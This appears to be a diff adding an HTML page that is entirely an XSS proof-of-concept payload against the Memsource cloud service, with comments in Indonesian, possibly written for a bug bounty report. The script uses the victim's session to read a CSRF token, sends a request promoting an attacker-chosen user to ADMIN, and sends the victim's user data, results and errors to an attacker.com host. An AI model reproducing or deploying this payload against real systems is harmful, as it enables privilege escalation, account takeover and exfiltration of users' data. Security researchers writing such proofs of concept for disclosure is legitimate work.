@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+	<body>
+    <script>
+      // Payload XSS untuk Memsource Admin Escalation
+      // Target: Promote current user to ADMIN
+      
+      // Step 1: Ambil CSRF token dari internal endpoint
+      fetch('https://cloud.memsource.com/web/internal/v1/users/current', {
+          method: 'GET',
+          credentials: 'include',
+          headers: {
+              'Accept': 'application/json',
+              'X-Requested-With': 'XMLHttpRequest'
+          }
+      })
+      .then(response => response.json())
+      .then(userData => {
+          // Extract CSRF token dari response JSON
+          // Biasanya ada di field 'csrfToken' atau 'token'
+          const csrfToken = userData.csrfToken || userData.token || userData.data?.csrfToken;
+          
+          if (!csrfToken) {
+              // Fallback: kirim ke server attacker untuk debug
+              fetch('https://attacker.com/xss-log?step=csrf-not-found&data=' + encodeURIComponent(JSON.stringify(userData)));
+              return;
+          }
+          
+          // Step 2: Kirim request untuk jadikan user sebagai ADMIN
+          // Note: TARGET_ID harus diganti dengan ID user attacker
+          // Contoh: yD6g4rpcvcbp9JCazqrxk1
+          const targetUserId = 'TARGET_USER_ID'; // GANTI INI
+          
+          fetch(`https://cloud.memsource.com/web/api2/v3/users/${targetUserId}`, {
+              method: 'PUT',
+              credentials: 'include',
+              headers: {
+                  'Content-Type': 'application/json',
+                  'Accept': 'application/json, text/plain, */*',
+                  'X-Csrf-Token': csrfToken,
+                  'X-User-Agent': 'memsource-web',
+                  'Origin': 'https://cloud.memsource.com',
+                  'Referer': `https://cloud.memsource.com/tms/user/edit/${targetUserId}`,
+                  'Sec-Fetch-Dest': 'empty',
+                  'Sec-Fetch-Mode': 'cors',
+                  'Sec-Fetch-Site': 'same-origin'
+              },
+              body: JSON.stringify({
+                  firstName: "evil",
+                  lastName: "cathack", 
+                  email: "aydilfhr+evil@intigriti.me",
+                  userName: "aydilfhr+evil",
+                  role: "ADMIN",
+                  timezone: "Europe/London",
+                  active: true,
+                  note: ""
+              })
+          })
+          .then(response => {
+              // Step 3: Kirim hasil ke server attacker untuk konfirmasi
+              return response.json().catch(() => ({ status: response.status }));
+          })
+          .then(result => {
+              fetch('https://attacker.com/xss-success?result=' + encodeURIComponent(JSON.stringify(result)));
+          })
+          .catch(error => {
+              fetch('https://attacker.com/xss-error?message=' + encodeURIComponent(error.message));
+          });
+      })
+      .catch(error => {
+          // Log error ke attacker server
+          fetch('https://attacker.com/xss-error?step=csrf-fetch&error=' + encodeURIComponent(error.message));
+      });
+      </script>
+	</body>
+</html>
